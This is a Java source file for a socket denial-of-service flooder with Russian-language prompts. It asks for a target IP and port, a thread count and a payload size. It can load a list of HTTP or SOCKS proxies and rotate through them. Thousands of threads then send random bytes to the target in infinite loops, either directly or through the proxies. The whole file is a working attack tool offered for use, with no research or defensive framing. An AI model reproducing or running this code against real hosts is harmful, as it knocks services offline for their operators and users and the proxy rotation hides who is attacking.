package ru.shved255.tools.socketdos;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import ru.shved255.Main;

public class SocketDoS {
	Main plugin;
    String ip;
    int port;
    int threadsAmount;
    int bytesLength;
    boolean useProxy;
    int proxyType;
    HashMap<String, Integer> proxyServers = new HashMap();
    List<String> proxyServersAsList;
    SecureRandom random = new SecureRandom();

    public void start() {
        try (Scanner scanner = new Scanner(System.in)) {
			System.out.print("Введите айпи с портом (127.0.0.1:80): ");
			String[] ipParts = scanner.nextLine().split(":");
			this.ip = ipParts[0];
			this.port = Integer.parseInt(ipParts[1]);
			System.out.print("Введите кол-во потоков (3000): ");
			this.threadsAmount = Integer.parseInt(scanner.nextLine());
			System.out.print("Введите кол-во байтов (500): ");
			this.bytesLength = Integer.parseInt(scanner.nextLine());
			System.out.print("Использовать прокси? y/n (y): ");
			this.useProxy = scanner.nextLine().equals("y");
			if (this.useProxy) {
			    System.out.print("1. HTTP/S\n");
			    System.out.print("2. SOCKS4\n");
			    System.out.print("3. SOCKS5\n");
			    System.out.print("Введите тип прокси: ");
			    this.proxyType = Integer.parseInt(scanner.nextLine());
			    System.out.print("Введите путь до файла с прокси в формате: ip:port: ");
			    String proxyPath = scanner.nextLine();
			    try {
			        Files.readAllLines(Paths.get(proxyPath, new String[0])).forEach(line -> {
			            String[] proxyParts = line.split(":");
			            if (proxyParts.length == 2) {
			                this.proxyServers.put(proxyParts[0], Integer.parseInt(proxyParts[1]));
			            }
			        });
			    } catch (IOException iOException) {
			    }
			    this.proxyServersAsList = new ArrayList<String>(this.proxyServers.keySet());
			}
		} catch (NumberFormatException e) {
			e.printStackTrace();
		}
        for (int threadId = 0; threadId < this.threadsAmount; ++threadId) {
            Thread thread = new Thread(new ByteSender());
            thread.start();
        }
        while (true) {
        }
    }

    class ByteSender
    implements Runnable {
        ByteSender() {
        }

        @Override
        public void run() {
            while (true) {
                try {
                    ExecutorService executor = Executors.newFixedThreadPool(threadsAmount);
                    executor.submit(() -> {
                    while (true) {
                        byte[] RandomBytes = new byte[SocketDoS.this.bytesLength];
                        SocketDoS.this.random.nextBytes(RandomBytes);
                        if (!SocketDoS.this.useProxy) {
                            Socket socket = new Socket(SocketDoS.this.ip, SocketDoS.this.port);
                            socket.getOutputStream().write(RandomBytes);
                            socket.close();
                            continue;
                        }
                        String randomProxyIp = SocketDoS.this.proxyServersAsList.get(new Random().nextInt(SocketDoS.this.proxyServersAsList.size()));
                        Integer randomProxyPort = SocketDoS.this.proxyServers.get(randomProxyIp);
                        Proxy proxy = SocketDoS.this.proxyType == 1 ? new Proxy(Proxy.Type.HTTP, new InetSocketAddress(randomProxyIp, (int)randomProxyPort)) : new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(randomProxyIp, (int)randomProxyPort));
                        Socket socket = new Socket(proxy);
                        socket.connect(new InetSocketAddress(SocketDoS.this.ip, SocketDoS.this.port));
                        socket.getOutputStream().write(RandomBytes);
                        socket.close();
                    }
                    });
                } catch (Exception exception) {
                    System.out.println("Ошибка (" + exception.getMessage() + ").");
                    try {
						plugin.main(null);
					} catch (Throwable e) {
						e.printStackTrace();
					}
                    return;
                }
            }
        }
    }
}

